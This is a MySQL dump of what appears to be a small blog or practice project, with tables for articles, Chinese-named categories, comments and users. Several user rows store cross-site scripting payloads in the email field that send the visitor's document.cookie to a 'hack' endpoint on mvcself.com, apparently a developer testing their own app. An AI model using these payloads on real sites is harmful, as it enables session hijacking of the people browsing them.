/*
Navicat MySQL Data Transfer

Source Server         : db_oa
Source Server Version : 50547
Source Host           : localhost:3306
Source Database       : userlist4

Target Server Type    : MYSQL
Target Server Version : 50547
File Encoding         : 65001

Date: 2017-10-21 07:30:36
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `category_id` int(11) NOT NULL DEFAULT '0',
  `author_id` int(11) NOT NULL,
  `title` varchar(25) NOT NULL,
  `published_date` int(11) NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `content` text,
  `top` tinyint(4) NOT NULL DEFAULT '2',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES ('1', '5', '0', '1', '1507436347', '0', '<p>1</p>\r\n', '2');
INSERT INTO `article` VALUES ('2', '2', '2', '2', '2', '12', '2', '2');

-- ----------------------------
-- Table structure for category
-- ----------------------------
DROP TABLE IF EXISTS `category`;
CREATE TABLE `category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sort` int(11) NOT NULL DEFAULT '0',
  `name` varchar(10) NOT NULL,
  `nickname` varchar(30) NOT NULL DEFAULT '',
  `parent_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of category
-- ----------------------------
INSERT INTO `category` VALUES ('1', '50', '科技', '', '0');
INSERT INTO `category` VALUES ('2', '50', '武侠', '', '0');
INSERT INTO `category` VALUES ('3', '50', '旅游', '', '0');
INSERT INTO `category` VALUES ('4', '50', '美食', '', '0');
INSERT INTO `category` VALUES ('5', '50', 'IT', '', '1');
INSERT INTO `category` VALUES ('6', '50', '生物', '', '1');
INSERT INTO `category` VALUES ('7', '50', '鸟类', '', '6');
INSERT INTO `category` VALUES ('8', '50', '湘菜', '', '4');
INSERT INTO `category` VALUES ('9', '50', '粤菜', '', '4');
INSERT INTO `category` VALUES ('10', '50', '川菜', '', '4');
INSERT INTO `category` VALUES ('11', '50', '跳跳蛙', '', '8');
INSERT INTO `category` VALUES ('12', '50', '口味虾', '', '8');
INSERT INTO `category` VALUES ('13', '50', '臭豆腐', '', '8');
INSERT INTO `category` VALUES ('14', '50', '白切鸡', '', '9');
INSERT INTO `category` VALUES ('15', '50', '隆江猪脚', '', '9');
INSERT INTO `category` VALUES ('16', '50', '火锅', '', '0');
INSERT INTO `category` VALUES ('17', '50', '未命名', '', '0');

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `article_id` int(11) NOT NULL,
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `content` varchar(500) NOT NULL,
  `publish_time` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of comment
-- ----------------------------
INSERT INTO `comment` VALUES ('2', '2', '2', '0', '么么哒', '1464936962');
INSERT INTO `comment` VALUES ('3', '1', '3', '0', '么么哒', '1464936964');
INSERT INTO `comment` VALUES ('4', '3', '3', '0', '么么哒', '1464936969');
INSERT INTO `comment` VALUES ('5', '2', '1', '0', '么么哒', '1464936965');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `nickname` varchar(10) NOT NULL,
  `email` varchar(180) NOT NULL,
  `last_login_at` int(11) NOT NULL DEFAULT '0',
  `last_login_ip` varchar(15) NOT NULL DEFAULT '',
  `password` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=55 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES ('26', 'haolou', '11', '1', '0', '', '89484b14b36a8d5329426a3d944d2983');
INSERT INTO `user` VALUES ('27', 'yuan', 'r', '', '0', '', '89484b14b36a8d5329426a3d944d2983');
INSERT INTO `user` VALUES ('28', 'yuan111', 'ru', '', '0', '', '89484b14b36a8d5329426a3d944d2983');
INSERT INTO `user` VALUES ('29', 'yuan233', 'ru', '', '0', '', '89484b14b36a8d5329426a3d944d2983');
INSERT INTO `user` VALUES ('30', 'yuan233', 'ru', '', '0', '', '89484b14b36a8d5329426a3d944d2983');
INSERT INTO `user` VALUES ('46', '1', '1', '', '0', '', '');
INSERT INTO `user` VALUES ('47', '1', '1', '', '0', '', '');
INSERT INTO `user` VALUES ('48', '1', '1', '1111111111111111', '0', '', '');
INSERT INTO `user` VALUES ('50', '3', '3', '<script>var img = new Image();\r\nimg.src = \"http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=\".window.docmnet.cookie;</script>\r\n>', '0', '', '');
INSERT INTO `user` VALUES ('51', '5', '5', '<script>var img = new Image(); img.src = \"http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=\".window.docmnet.cookie;</script>', '0', '', '');
INSERT INTO `user` VALUES ('52', 'q', 'q', '<script>var img = new Image(); img.src = \"http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=\"+window.docmnet.cookie;</script>', '0', '', '');
INSERT INTO `user` VALUES ('53', '1', '11', '<script>var img = new Image(); img.src = \"http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=\" + window.document.cookie;</script>', '0', '', '');
INSERT INTO `user` VALUES ('54', '1', '1', 'var img = new Image(); img.src = \"http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=\" + window.document.cookie;', '0', '', '');
